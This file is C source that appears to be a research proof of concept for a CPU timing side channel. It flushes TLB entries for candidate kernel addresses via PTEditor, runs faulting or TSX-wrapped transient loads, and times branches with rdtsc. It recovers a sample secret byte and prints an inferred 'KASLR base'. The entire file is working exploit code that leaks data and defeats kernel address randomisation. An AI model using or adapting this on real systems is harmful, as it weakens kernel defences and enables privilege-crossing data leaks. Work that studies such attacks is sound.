#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <setjmp.h>
#include "include/cache_utils.h"
#include "third_party/PTEditor/ptedit_header.h"

#define FROM 'A'
#define TO 'Z'

#ifndef SIG_UNBLOCK
#define SIG_UNBLOCK 1
#endif

#define USE_SYSTEM_JMP

static jmp_buf jbuf;
size_t test_num, argmax;
uint64_t secret = 83, len = 5, try_times = 500, success_count;
uint64_t start_time, spend_time, max_time;
int hist[256];
int record[256];

static void segfault_handler(int signum)
{
    (void)signum;
    unblock_signal(SIGSEGV);
    longjmp(jbuf, 1);
}

int main(int argc, char *argv[])
{
    ptedit_init();
    signal(SIGSEGV, segfault_handler);
    success_count = 0;
    size_t invalid_addrs[] = {
        // 0x0,
        // 0xffffull,
        // 0xfffffc0000000000ull,
        // 0xffffff8000000000ull,
        // 0xffffffffffe00000ull,

        // 0xff10000000000000ull,
        // 0xff11000000000000ull,
        // 0xff12000000000000ull,
        // 0xffffffffc0b00000ull,
        // 0xffffffff80000000ull,
        // 0xffffffff00000000ull,
        // 0xffffffff7fffffffull,
        0xffffffff80000000ull,
        0xffffffff81000000ull,
        0xffffffff81e00000ull,
        0xffffffff81c00000ull,
        0xffffffff82000000ull,
        0xffffffff83000000ull,
        // 0xffffffff84000000ull,
        // 0xffffffff85000000ull,
        // 0xffffffff93e00000ull,
        // 0xffffffff94e00000ull,
        // 0xffffffff95e00000ull,
        // 0xffffffff85200000ull,
        // 0xffffffff90000000ull,
        // 0xffffffffffffffffull,
        // 0xffffffff80000000ull,
        // 0xffffffff81000000ull,
        // 0xffffffff82000000ull,
        // 0xffffffff83000000ull,
        // 0xffffffff84000000ull,
        // 0xffffffff89000000ull,
    };

    for (size_t b = 0; b < sizeof(invalid_addrs) / sizeof(size_t); b++)
    {
        size_t invalid_addr = invalid_addrs[b];
        mfence();
        success_count = 0;
        printf("invalid_addr: %p\n", invalid_addr);
        for (int size = 0; size < len; size++)
        {
            for (int i = 0; i < 256; i++)
                hist[i] = 0;

            for (int i = 0; i < try_times; i++)
            {
                max_time = 0;
                for (test_num = 0; test_num < 255; test_num++)
                {
                    for (size_t j = 0; j < sizeof(invalid_addrs) / sizeof(size_t); j++)
                    {
                        // This could be replaced by another invalidation method
                        ptedit_invalidate_tlb(invalid_addrs[j]);
                    }
                    mfence();
                    mfence();
                    mfence();

                    start_time = rdtsc();
#ifdef USE_SYSTEM_JMP
                    if (!setjmp(jbuf))
                    // verified in i9-10980XE, etc.
#else
                    if (xbegin() == (~0u))
                    // verified in i7-6700, i7-7700, etc.
#endif
                    {
                        asm volatile(
                            "mov %[test_num], %%rbx\n\t"
                            "movq (%1), %%rax\n\t"
                            // ".rept 184\n\t"
                            // "nop\n\t"
                            // ".endr\n\t"
                            "sub (%[sec]), %%rbx\n\t" // 83 = 0x53 = 'S', 88 = 0x58 = 'X'
                            // 0xffff889000000000
                            // 0xffff888000000000
                            // 0xffff887000000000
                            // 0x0

                            // 56-bit, 5-level page tables
                            // 0xffffffff00000000 ... unused hole
                            // 0xffffffff7fffffff ... kernel text mapping, mapped to physical address 0
                            // 0xffffffff80000000 ... kernel text mapping, mapped to physical address 0
                            // 0xffffffffffffffff ... unused hole
                            :
                            : [test_num] "r"(test_num), "c"(invalid_addr), [sec] "r"(&secret)
                            :);
                    }

                    asm volatile(
                        "jz equal\n\t"
                        "jmp notequal\n\t"
                        "equal: nop\n\t");
                    printf("you can not see me\n");
                    asm volatile(
                        "notequal: nop\n\t");
                    spend_time = rdtsc() - start_time;
                    if (max_time < spend_time)
                    {
                        max_time = spend_time;
                        argmax = test_num;
                    }
                }

                hist[argmax]++;
            }

            int max_i = -1, max_i_index = -1;
            for (int i = FROM; i < TO; i++)
            {
                if (max_i < hist[i])
                {
                    max_i = hist[i];
                    max_i_index = i;
                }
            }

            printf("size: %d, ", size);
            printf("\t max_i: %d, ", max_i);
            printf("\t max_i_index: %c\n", max_i_index);
            if (max_i_index == secret)
                success_count++;
        }
        printf("success_count: %d\n", success_count);
        record[b] = success_count;
    }
    ptedit_cleanup();

    int min_i = 1000000000, min_i_index = -1;
    for (int i = 0; i < sizeof(invalid_addrs) / sizeof(size_t); i++)
    {
        if (min_i > record[i])
        {
            min_i = record[i];
            min_i_index = i;
        }
    }
    printf("KASLR base: 0x%016lx\n", invalid_addrs[min_i_index]);
    return 0;
}